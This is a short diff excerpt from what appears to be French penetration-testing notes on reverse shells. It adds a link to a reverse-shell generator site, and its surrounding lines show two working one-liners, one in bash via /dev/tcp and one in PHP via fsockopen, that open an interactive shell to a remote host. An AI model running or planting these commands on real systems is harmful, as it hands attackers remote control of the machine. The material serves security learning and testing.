@@ -52,5 +52,7 @@ Exemples :
 - bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
 - php -r '$sock=fsockopen("IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
+Générateur de Reverse Shell : https://www.revshells.com/
+
 Utilisation :
 - Si une exécution de commande est possible
